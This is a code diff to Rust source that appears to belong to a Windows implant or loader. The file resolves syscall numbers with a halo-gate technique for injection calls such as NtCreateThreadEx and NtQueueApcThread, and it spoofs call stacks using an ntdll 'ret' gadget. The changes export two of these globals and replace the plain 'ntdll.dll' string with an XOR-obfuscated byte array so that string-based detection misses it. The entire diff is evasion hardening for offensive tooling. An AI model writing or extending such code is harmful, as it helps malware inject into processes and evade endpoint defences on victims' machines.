@@ -148,6 +148,7 @@ pub static mut SSN_NT_PROTECT_VIRTUAL_MEMORY: u32 = 0;
 pub static mut SSN_NT_WRITE_VIRTUAL_MEMORY: u32 = 0;
 pub static mut SSN_NT_READ_VIRTUAL_MEMORY: u32 = 0;
 pub static mut SSN_NT_OPEN_PROCESS: u32 = 0;
+#[no_mangle]
 pub static mut SSN_NT_CREATE_THREAD_EX: u32 = 0;
 pub static mut SSN_NT_QUEUE_APC_THREAD: u32 = 0;
 pub static mut SSN_NT_UNMAP_VIEW_OF_SECTION: u32 = 0;
@@ -173,6 +174,7 @@ pub struct ProcessBasicInformation {
 
 /// Address of a `ret` (0xC3) gadget inside ntdll.dll, set by init_stack_spoof().
 /// Used by dm_syscall_spoofed to forge a clean call stack during syscalls.
+#[no_mangle]
 pub static mut DM_NTDLL_RET_GADGET: u64 = 0;
 
 unsafe fn find_export(ntdll_base: *const u8, name_hash: u32) -> Option<*const u8> {
@@ -246,8 +248,8 @@ unsafe fn halo_gate(stub: *const u8) -> Option<u32> {
 }
 
 unsafe fn resolve_ssn(name_hash: u32) -> Option<u32> {
-    let ntdll_name = b"ntdll.dll\0";
-    let base = GetModuleHandleA(ntdll_name.as_ptr()) as *const u8;
+    let s_ntdll = crate::obfs::dec(&[0x34,0x2E,0x3E,0x36,0x36,0x74,0x3E,0x36,0x36,0x5A]);
+    let base = GetModuleHandleA(s_ntdll.as_ptr()) as *const u8;
     if base.is_null() {
         return None;
     }
@@ -290,7 +292,8 @@ pub fn init() -> bool {
 #[cfg(all(target_os = "windows", feature = "stack-spoof"))]
 pub fn init_stack_spoof() {
     unsafe {
-        let base = GetModuleHandleA(b"ntdll.dll\0".as_ptr()) as *const u8;
+        let s_ntdll = crate::obfs::dec(&[0x34,0x2E,0x3E,0x36,0x36,0x74,0x3E,0x36,0x36,0x5A]);
+        let base = GetModuleHandleA(s_ntdll.as_ptr()) as *const u8;
         if base.is_null() {
             return;
         }
